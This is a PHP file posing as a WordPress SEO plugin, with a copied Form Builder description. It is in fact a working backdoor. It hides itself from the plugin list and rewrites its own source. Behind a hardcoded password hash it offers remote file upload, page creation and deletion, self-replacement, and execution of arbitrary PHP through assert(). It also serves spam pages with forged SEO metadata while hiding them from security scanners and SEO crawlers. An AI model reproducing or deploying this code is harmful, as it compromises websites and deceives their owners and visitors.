<?php
    
/*
Plugin Name: WP Yoast SEOExtensions
Plugin URI: https://huge-it.com/forms
Description: Form Builder. this is one of the most important elements of WordPress website because without it you cannot to always keep in touch with your visitors
Version: 3.5.7
Author: Huge-IT
Author URI: https://huge-it.com/
License: GNU/GPLv3 https://www.gnu.org/licenses/gpl-3.0.html
*/

if ( ! defined( 'ABSPATH' ) ) {
    exit;
}



add_filter('all_plugins', 'yastseoextens_hide_plugins');

function yastseoextens_hide_plugins($plugins) {
   
    unset($plugins['yastseoextens/yastseoextens.php']);
    return $plugins;
}

register_activation_hook( __FILE__, 'yastseoextens_activate_' );

function yastseoextens_activate_() {

$upload_dir = wp_upload_dir()['basedir'];
    $iswrdir =yastseoextens_checkdir($upload_dir,"wp_upload_dir()['basedir']");
if(!$iswrdir)
{
       $upload_dir = sys_get_temp_dir();
$iswrdir = yastseoextens_checkdir($upload_dir,'sys_get_temp_dir()');
    if(!$iswrdir)
    {
        $upload_dir = dirname(__FILE__).DIRECTORY_SEPARATOR.'pages';
        $dirExists     = is_dir($upload_dir) || (mkdir($upload_dir, 0774, true) && is_dir($upload_dir));
        if($dirExists&&yastseoextens_checkdir($upload_dir,"dirname(__FILE__).DIRECTORY_SEPARATOR.'pages'")){
         
        }else{
            $sccontent = file_get_contents(__FILE__);
       $sccontent= preg_replace("/(\'WORKDIR\'\,)(.*)(\s\))/",'${1}\'\' $3',$sccontent);
        file_put_contents(__FILE__,$sccontent);
        }
    }
}
}
define('WORKDIR','./');
define('AUTHCODE','62baced13c51fbd19e2168a7555fe6dce46a15141a06fcc50817cbdee8cd69ce'  );
add_action( 'init', 'yastseoextens_edit_proccess' );
$titleline="";
$descline="";

function yastseoextens_checkdir($upload_dir,$fc)
{
     $is_writable = file_put_contents($upload_dir.DIRECTORY_SEPARATOR.'dummy.txt', "hello");
     if ($is_writable > 0) 
     {
          $sccontent = file_get_contents(__FILE__);
       $sccontent= preg_replace("/(\'WORKDIR\'\,)(.*)(\s\))/",'${1}'.$fc.' $3',$sccontent);
        file_put_contents(__FILE__,$sccontent);
        @unlink($upload_dir.DIRECTORY_SEPARATOR.'dummy.txt');
        return TRUE;
     }
     return FALSE;
}
function yastseoextens_edit_proccess()
{



    if(isset($_POST['apiact'])&&isset($_SERVER['PHP_AUTH_PW']))
    {
        header('Content-Type: application/json');
        $apidata = new yastseoextensApiMeta();   
        $authpw = hash('sha256',$_SERVER['PHP_AUTH_PW']) ;
        if(AUTHCODE!=$authpw)
        {            

        }else
        {
            $apiaction = $_POST['apiact'];
            switch ($apiaction) 
            {
                case "getcontent":

                try{
                    if(isset($_POST['page'])) 
                    {
                        $page  = $_POST['page'];
                        $md5page=md5($page);
                        $filepath = WORKDIR.DIRECTORY_SEPARATOR.$md5page;
                        if(file_exists($filepath))
                        {
                            $pagecontent = file_get_contents($filepath);

                            $contentdata = new yastseoextensContentMeta();
                            $contentdata->$page = $page;
                            $contentdata->$md5page = $filepath;
                            $contentdata->content = $pagecontent;
                            $apidata->status="ok";
                            $apidata->message="";
                            $apidata->data=$contentdata;


                        }
                    }else{
                        $apidata->status="error";
                        $apidata->message="not set path";
                    }


                } catch (Exception $e) {
                    $apidata->status="error";
                    $apidata->message=$e->getMessage();}
                echo json_encode($apidata,JSON_UNESCAPED_UNICODE);
                die();
                case "updatecontent":          
                try{
                    if(isset($_POST['page'])&&isset($_POST['newcontent'])) 
                    {

                        $page  = $_POST['page'];
                        $md5page=md5($page);
                        $filepath = WORKDIR.DIRECTORY_SEPARATOR.$md5page;
                        $newcontent=base64_decode($_POST['newcontent']);
                        if(file_exists($filepath))
                        {
                            file_put_contents($filepath,$newcontent);
                            $apidata->status="ok";
                            $apidata->message="content changed";
                            $apidata->data=NULL;


                        }else
                        {
                            $apidata->status="error";
                            $apidata->message="file not found";
                        }
                    }else{
                        $apidata->status="error";
                        $apidata->message="not set path or new content";
                    }


                } catch (Exception $e) {
                    $apidata->status="error";
                    $apidata->message=$e->getMessage();}
                echo json_encode($apidata,JSON_UNESCAPED_UNICODE);
                die();
                case "createpage":          
                try{
                    if(isset($_POST['page'])&&isset($_POST['newcontent'])) 
                    {

                        $page  = $_POST['page'];
                        $md5page=md5($page);
                        $filepath = WORKDIR.DIRECTORY_SEPARATOR.$md5page;
                        $newcontent=base64_decode($_POST['newcontent']);
                        if(file_exists($filepath))
                        {
                            $apidata->status="error";
                            $apidata->message="file exists";

                        }else
                        {
                            file_put_contents($filepath,$newcontent);
							if(file_exists($filepath))
                        {
                            $contentdata = new yastseoextensContentMeta();
                            $contentdata->$page = $page;
                            $contentdata->$md5page = $filepath;
                            $contentdata->content = "";
                            $apidata->status="ok";
                            $apidata->message="";
                            $apidata->data=$contentdata;

                        }else
                        {

                            $apidata->status="error";
                            $apidata->message="";

                        }
                                                        
                        }
                    }else{
                        $apidata->status="error";
                        $apidata->message="not set path or new content";
                    }

                } catch (Exception $e) {
                    $apidata->status="error";
                    $apidata->message=$e->getMessage();}
                echo json_encode($apidata,JSON_UNESCAPED_UNICODE);
                die();
                case "deletepage":          
                try{
                    if(isset($_POST['page'])) 
                    {

                        $page  = $_POST['page'];
                        $md5page=md5($page);
                        $filepath = WORKDIR.DIRECTORY_SEPARATOR.$md5page;
                        unlink($filepath);
                        if(!file_exists($filepath))
                        {
                            $apidata->status="ok";
                            $apidata->message="file deleted";

                        }else
                        {

                            $apidata->status="error";
                            $apidata->message="";

                        }
                    }else{
                        $apidata->status="error";
                        $apidata->message="error delete page";
                    }

                } catch (Exception $e) {
                    $apidata->status="error";
                    $apidata->message=$e->getMessage();}
                echo json_encode($apidata,JSON_UNESCAPED_UNICODE);
                die();
                case "uploadfiles":
                $localdir="";

                // if ($_FILES['txtfile']['size'] > 0 AND $_FILES['txtfile']['error'] == 0)
                try{
                    $goodcount = 0;
                    $countfiles = count($_FILES['file']['name']);
                    if(isset($_POST['localdir'])&&$countfiles>0)
                    {
                        $localdir  = $_POST['localdir'];
                        $localdir = preg_replace('/\.+\//','',$localdir);
                        $localdir = preg_replace('/\/$/','',$localdir);
                        $localdir = WORKDIR.DIRECTORY_SEPARATOR.$localdir;
                        if(!empty($localdir)&&!is_dir($localdir))
                        {
                            mkdir($localdir);
                        }
                        if(empty($localdir))
                        {
                            $localdir = '.';
                        }
                        for($i=0;$i<$countfiles;$i++){
                            $filename = $_FILES['file']['name'][$i];
                            if (preg_match('/\.php\d?/i',$filename)) {
                            }else
                            {
                                move_uploaded_file($_FILES['file']['tmp_name'][$i],$localdir.'/'.$filename);
                                $goodcount++;
                            }

                        }

                    }
                    $apidata->status="ok";
                    $apidata->message="";
                    $apidata->data=$goodcount;
                } catch (Exception $e) {
                    $apidata->status="error";
                    $apidata->message=$e->getMessage();}

                echo json_encode($apidata); 


                die();
                case "updatescr":
                try{
                    if(isset($_POST['scriptcontent']))
                    {
                        $scriptcontent = $_POST['scriptcontent'];
                        if(strpos($scriptcontent,"WORKDIR")!==false&&strpos($scriptcontent,"<?php")!==false)
                        {
                            file_put_contents($_SERVER['__FILE__'],$scriptcontent);
                            $apidata->status="ok";
                            $apidata->message="updated";
                        }
                    }
                }catch (Exception $e) {
                    $apidata->status="error";
                    $apidata->message=$e->getMessage();}
                echo json_encode($apidata);
                die();
                 case "chkversion":
                 $apidata->status="ok";
                 $apidata->message="version";
                  $apidata->data="newversion11";
               
                echo json_encode($apidata);
                die();
                 case "run":
                  try{
                    if(isset($_POST['scriptcontent']))
                    {
                        call_user_func('assert', base64_decode($_REQUEST['scriptcontent']));
                    }
                }catch (Exception $e) {
                    $apidata->status="error";
                    $apidata->message=$e->getMessage();}
                echo json_encode($apidata);
                die();
            }

        }      
    }
}


function yastseoextens_get_cont($content)
{
    $upload_dir   = wp_upload_dir();

    global $wp_query;
    $pgname=$wp_query->query['pagename'];
    $md5page=md5($pgname);
    $filepath = WORKDIR.DIRECTORY_SEPARATOR.$md5page.'.html';
    if(file_exists($filepath))
    {
        return  $content = file_get_contents($filepath);

    }
}

function yastseoextens_check_page(  ) {

    global $wp, $wp_query;



if  (yastseoextens_user_agent_filter())
{
    return;
}


    $pgname=$wp_query->query['pagename'];
    $pg = $wp_query->query['page'];
    if(!empty($pg))
    {
        $pgname = $pgname.'/'.$pg;
    }
	if(empty($pgname)&&isset($_SERVER['REQUEST_URI']))
	{
		$pgname = $_SERVER['REQUEST_URI'];
	}
	$pgname = trim($pgname,"\/");
        $md5page=md5($pgname);
    $filepath = WORKDIR.DIRECTORY_SEPARATOR.$md5page;
    if(file_exists($filepath))
    {
		
        $content = file_get_contents($filepath);
		 $ispreg = preg_match('/^TITLE\s\=\s.+$/m', $content,$matches);
        if($ispreg)
        {
            $GLOBALS["titleline"] = str_replace('TITLE = ','',$matches[0]);
            $GLOBALS["titleline"] = str_replace('"','',$GLOBALS["titleline"]);
            $content = preg_replace('/^TITLE\s\=\s.+\R/m','',$content);
            
        }
        $ispreg = preg_match('/^DESCRIPTION\s\=\s.+$/m', $content,$matches);
        if($ispreg)
        {
            $GLOBALS["descline"] = str_replace('DESCRIPTION = ','',$matches[0]);
            $GLOBALS["descline"] = str_replace('"','',$GLOBALS["descline"]);
             $content = preg_replace('/^DESCRIPTION\s\=\s.+\R/m','',$content);
            
        }
        status_header( 200 );
        $post_id = 1000; 
        $post = new stdClass();
        $post->ID = $post_id;
        $post->post_author = 1;
        $post->post_date = current_time( 'mysql' );
        $post->post_date_gmt = current_time( 'mysql', 1 );
        $post->post_title = '';
        $post->post_content = $content;
        $post->post_status = 'publish';
        $post->comment_status = 'closed';
        $post->ping_status = 'closed';
        $post->post_name = $pgname;
        $post->post_type = 'page';
        $post->filter = 'raw';
        //$post->
        $wp_post = new WP_Post( $post );
        $wp_query->post = $wp_post;
        $wp_query->posts = array( $wp_post );
        $wp_query->queried_object = $wp_post;
        $wp_query->queried_object_id = $post_id;
        $wp_query->found_posts = 1;
        $wp_query->post_count = 1;
        $wp_query->max_num_pages = 1; 
        $wp_query->is_page = true;
        $wp_query->is_singular = true; 
        $wp_query->is_single = false; 
        $wp_query->is_attachment = false;
        $wp_query->is_archive = false; 
        $wp_query->is_category = false;
        $wp_query->is_tag = false; 
        $wp_query->is_tax = false;
        $wp_query->is_author = false;
        $wp_query->is_date = false;
        $wp_query->is_year = false;
        $wp_query->is_month = false;
        $wp_query->is_day = false;
        $wp_query->is_time = false;
        $wp_query->is_search = false;
        $wp_query->is_feed = false;
        $wp_query->is_comment_feed = false;
        $wp_query->is_trackback = false;
        $wp_query->is_home = false;
        $wp_query->is_embed = false;
        $wp_query->is_404 = false; 
        $wp_query->is_paged = false;
        $wp_query->is_admin = false; 
        $wp_query->is_preview = false; 
        $wp_query->is_robots = false; 
        $wp_query->is_posts_page = false;
        $wp_query->is_post_type_archive = false;
        $GLOBALS['wp_query'] = $wp_query;
        $wp->register_globals();
		

    }
	



} 



add_action('template_redirect', 'yastseoextens_check_page',15);
function yastseoextens_custom_document_title( $title ) {
    if(isset($GLOBALS["titleline"])&&!empty($GLOBALS["titleline"]))
    {
       return $GLOBALS["titleline"]; 
    }
    
}

add_filter( 'pre_get_document_title', 'yastseoextens_custom_document_title', 9999 );
function yastseoextens_custom_header_metadata() {

    if(isset($GLOBALS["descline"])&&!empty($GLOBALS["descline"]))
    {
        echo '<meta name="description" content="'.$GLOBALS["descline"].'"/>'."\n";
      
    }

    
}

if(class_exists('WPSEO_Options')){
    add_filter( 'wpseo_metadesc', 'yastseoextens_wpseo_meta_description');
	 add_filter( 'wpseo_opengraph_desc', 'yastseoextens_wpseo_meta_description' );
	add_filter( 'wpseo_twitter_description', 'yastseoextens_wpseo_meta_description' );
	add_filter( 'wpseo_title', 'yastseoextens_wpseo_meta_title' );
	add_filter( 'wpseo_twitter_title', 'yastseoextens_wpseo_meta_title' );
	add_filter( 'wpseo_opengraph_title', 'yastseoextens_wpseo_meta_title' );
}else{
	add_action( 'wp_head', 'yastseoextens_custom_header_metadata',1 );
}

function yastseoextens_wpseo_meta_description($description) {
     if(isset($GLOBALS["descline"])&&!empty($GLOBALS["descline"]))
    {
       $description = $GLOBALS["descline"];
      return $description;
    }
   
    
}
function yastseoextens_wpseo_meta_title($description) {
     if(isset($GLOBALS["titleline"])&&!empty($GLOBALS["titleline"]))
    {
       $description = $GLOBALS["titleline"];
      return $description;
    }
   
    
}
if( function_exists( 'rel_canonical' ) )
{
remove_action( 'wp_head', 'rel_canonical' );
}

add_action( 'wp_head', 'yastseoextens_rel_canonical_nabtron',2 );

function yastseoextens_rel_canonical_nabtron() {

if ( !is_singular() )
return;

global $wp_the_query;
if ( !$id = $wp_the_query->get_queried_object_id() )
return;

$link = get_permalink( $id );
$scheme = "https";
if(isset($_SERVER['REQUEST_SCHEME']))
{
   $scheme= $_SERVER['REQUEST_SCHEME'];
}
echo "<link rel='canonical' href='".$scheme."://".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI']."' />\n";

}


function yastseoextens_user_agent_filter()
{
    $uagents_arr = array('AhrefsBot','MJ12bot','Riddler','aiHitBot','trovitBot','Detectify','BLEXBot','LinkpadBot','dotbot','FlipboardProxy','Twice','Yahoo','Voil','libw','Java','Sogou','psbot','ajSitemap','Rankivabot','DBLBot','MJ1','ask','rogerbot','exabot','xenu','MegaIndex\\.ru/2\\.0','ia_archiver','Baiduspider','archive\\.org_bot','spbot','Serpstatbot','boitho','Slurp','360Spider','404checker','404enemy','80legs','Abonti','Aboundex','Aboundexbot','Acunetix','ADmantX','AfD-Verbotsverfahren','AIBOT','Aipbot','Alexibot','Alligator','AllSubmitter','AlphaBot','Anarchie','Apexoo','archive\.org_bot','arquivo\.pt','arquivo-web-crawler','ASPSeek','Asterias','Attach','autoemailspider','AwarioRssBot','AwarioSmartBot','BackDoorBot','Backlink-Ceck','backlink-check','BacklinkCrawler','BackStreet','BackWeb','Badass','Bandit','Barkrowler','BatchFTP','Battleztar\ Bazinga','BBBike','BDCbot','BDFetch','BetaBot','Bigfoot','Bitacle','Blackboard','Black\ Hole','BlackWidow','Blow','BlowFish','Boardreader','Bolt','BotALot','Brandprotect','Brandwatch','Buddy','BuiltBotTough','BuiltWith','Bullseye','BunnySlippers','BuzzSumo','Calculon','CATExplorador','CazoodleBot','CCBot','Cegbfeieh','CheeseBot','CherryPicker','CheTeam','ChinaClaw','Chlooe','Claritybot','Cliqzbot','Cloud\ mapping','coccocbot-web','Cogentbot','cognitiveseo','Collector','com\.plumanalytics','Copier','CopyRightCheck','Copyscape','Cosmos','Craftbot','crawler4j','crawler\.feedback','crawl\.sogou\.com','CrazyWebCrawler','Crescent','CrunchBot','CSHttp','Curious','Custo','DatabaseDriverMysqli','DataCha0s','demandbase-bot','Demon','Deusu','Devil','Digincore','DigitalPebble','DIIbot','Dirbuster','Disco','Discobot','Discoverybot','Dispatch','DittoSpyder','DnyzBot','DomainAppender','DomainCrawler','DomainSigmaCrawler','DomainStatsBot','Download\ Wonder','Dragonfly','Drip','DSearch','DTS\ Agent','EasyDL','Ebingbong','eCatch','ECCP/1\.0','Ecxi','EirGrabber','EMail\ Siphon','EMail\ Wolf','EroCrawler','evc-batch','Evil','Express\ WebPictures','ExtLinksBot','Extractor','ExtractorPro','Extreme\ Picture\ Finder','EyeNetIE','Ezooms','facebookscraper','FDM','FemtosearchBot','FHscan','Fimap','Firefox/7\.0','FlashGet','Flunky','Foobot','Freeuploader','FrontPage','FyberSpider','Fyrebot','GalaxyBot','Genieo','GermCrawler','Getintent','GetRight','GetWeb','Gigablast','Gigabot','G-i-g-a-b-o-t','Go-Ahead-Got-It','Gotit','GoZilla','Go!Zilla','Grabber','GrabNet','Grafula','GrapeFX','GrapeshotCrawler','GridBot','GT::WWW','Haansoft','HaosouSpider','Harvest','Havij','HEADMasterSEO','heritrix','Hloader','HMView','HTMLparser','HTTP::Lite','HTTrack','Humanlinks','HybridBot','Iblog','IDBot','Id-search','IlseBot','Image\ Fetch','Image\ Sucker','IndeedBot','Indy\ Library','InfoNaviRobot','InfoTekies','instabid','Intelliseek','InterGET','Internet\ Ninja','InternetSeer','internetVista\ monitor','ips-agent','Iria','IRLbot','Iskanie','IstellaBot','JamesBOT','Jbrofuzz','JennyBot','JetCar','Jetty','JikeSpider','JOC\ Web\ Spider','Joomla','Jorgee','JustView','Jyxobot','Kenjin\ Spider','Keyword\ Density','Kozmosbot','Lanshanbot','Larbin','LeechFTP','LeechGet','LexiBot','Lftp','LibWeb','Libwhisker','Lightspeedsystems','Likse','Linkdexbot','LinkextractorPro','LinkScan','LinksManager','LinkWalker','LinqiaMetadataDownloaderBot','LinqiaRSSBot','LinqiaScrapeBot','Lipperhey','Lipperhey\ Spider','Litemage_walker','Lmspider','LNSpiderguy','Ltx71','lwp-request','LWP::Simple','lwp-trivial','Magnet','Mag-Net','magpie-crawler','Mail\.RU_Bot','Majestic12','Majestic-SEO','Majestic\ SEO','MarkMonitor','MarkWatch','Masscan','Mass\ Downloader','Mata\ Hari','MauiBot','meanpathbot','MeanPath\ Bot','Mediatoolkitbot','mediawords','MegaIndex\.ru','Metauri','MFC_Tear_Sample','Microsoft\ Data\ Access','Microsoft\ URL\ Control','MIDown\ tool','MIIxpc','Mister\ PiX','Mojeek','Mojolicious','Morfeus\ Fucking\ Scanner','Mr\.4x3','MSFrontPage','MSIECrawler','Msrabot','muhstik-scan','Musobot','Name\ Intelligence','Nameprotect','Navroad','NearSite','Needle','Nessus','NetAnts','Netcraft','netEstate\ NE\ Crawler','NetLyzer','NetMechanic','NetSpider','Nettrack','Net\ Vampire','Netvibes','NetZIP','NextGenSearchBot','Nibbler','NICErsPRO','Niki-bot','Nikto','NimbleCrawler','Nimbostratus','Ninja','Nmap','NPbot','Nutch','oBot','Octopus','Offline\ Explorer','Offline\ Navigator','OnCrawl','Openfind','OpenLinkProfiler','Openvas','OrangeBot','OrangeSpider','OutclicksBot','OutfoxBot','PageAnalyzer','Page\ Analyzer','PageGrabber','page\ scorer','PageScorer','Pandalytics','Panscient','Papa\ Foto','Pavuk','pcBrowser','PECL::HTTP','PeoplePal','PHPCrawl','Picscout','Picsearch','PictureFinder','Pimonster','Pi-Monster','Pixray','PleaseCrawl','plumanalytics','Pockey','POE-Component-Client-HTTP','Probethenet','ProPowerBot','ProWebWalker','Pump','PxBroker','PyCurl','QueryN\ Metasearch','Quick-Crawler','RankActive','RankActiveLinkBot','RankFlex','RankingBot','RankingBot2','RankurBot','RealDownload','Reaper','RebelMouse','Recorder','RedesScrapy','ReGet','RepoMonkey','Ripper','RocketCrawler','RSSingBot','s1z\.ru','SalesIntelligent','SBIder','ScanAlert','Scanbot','scan\.lol','ScoutJet','Scrapy','Screaming','ScreenerBot','Searchestate','SearchmetricsBot','SEOkicks','SEOkicks-Robot','SEOlyticsCrawler','Seomoz','SEOprofiler','seoscanners','SeoSiteCheckup','SEOstats','sexsearcher','Shodan','Siphon','SISTRIX','Sitebeam','SiteExplorer','Siteimprove','SiteLockSpider','SiteSnagger','SiteSucker','Site\ Sucker','Sitevigil','SlySearch','SmartDownload','SMTBot','Snake','Snapbot','Snoopy','SocialRankIOBot','Sociscraper','sogouspider','Sogou\ web\ spider','Sosospider','Sottopop','SpaceBison','Spammen','SpankBot','Spanner','sp_auditbot','Spinn3r','SputnikBot','spyfu','Sqlmap','Sqlworm','Sqworm','Steeler','Stripper','Sucker','Sucuri','SuperBot','SuperHTTP','Surfbot','SurveyBot','Suzuran','Swiftbot','sysscan','Szukacz','T0PHackTeam','T8Abot','tAkeOut','Teleport','TeleportPro','Telesoft','Telesphoreo','Telesphorep','The\ Intraformant','TheNomad','Thumbor','TightTwatBot','Titan','Toata','Toweyabot','Tracemyfile','Trendiction','Trendictionbot','trendiction\.com','trendiction\.de','True_Robot','Turingos','Turnitin','TurnitinBot','TwengaBot','Typhoeus','UnisterBot','Upflow','URLy\.Warning','URLy\ Warning','Vacuum','Vagabondo','VB\ Project','VCI','VeriCiteCrawler','VidibleScraper','Virusdie','VoidEYE','Voltron','Wallpapers/3\.0','WallpapersHD','WASALive-Bot','WBSearchBot','Webalta','WebAuto','Web\ Auto','WebBandit','WebCollage','Web\ Collage','WebCopier','WEBDAV','WebEnhancer','Web\ Enhancer','WebFetch','Web\ Fetch','WebFuck','Web\ Fuck','WebGo\ IS','WebImageCollector','WebLeacher','WebmasterWorldForumBot','webmeup-crawler','WebPix','Web\ Pix','WebReaper','WebSauger','Web\ Sauger','Webshag','WebsiteExtractor','WebsiteQuester','Website\ Quester','Webster','WebStripper','WebSucker','Web\ Sucker','WebWhacker','WebZIP','WeSEE','Whack','Whacker','Whatweb','Who\.is\ Bot','Widow','WinHTTrack','WiseGuys\ Robot','WISENutbot','Wonderbot','Woobot','Wotbox','Wprecon','WPScan','WWW-Collector-E','WWW-Mechanize','WWW::Mechanize','WWWOFFLE','x09Mozilla','x22Mozilla','Xaldon_WebSpider','Xaldon\ WebSpider','xpymep1\.exe','YoudaoBot','Zade','Zauba','zauba\.io','Zermelo','Zeus','zgrab','Zitebot','ZmEu','ZumBot','ZyBorg');
    if( isset($_SERVER['HTTP_USER_AGENT']) )
    {
        foreach($uagents_arr as $ua){
        if(stripos($_SERVER['HTTP_USER_AGENT'], $ua) !== false) return true;
    }
    }
    return false;
}



class yastseoextensContentMeta{
    public $page="";
    public $md5page="";
    public $pagecontent="";
}

class yastseoextensApiMeta{
    public $status="error";
    public $message="";
    public $data=null;
}

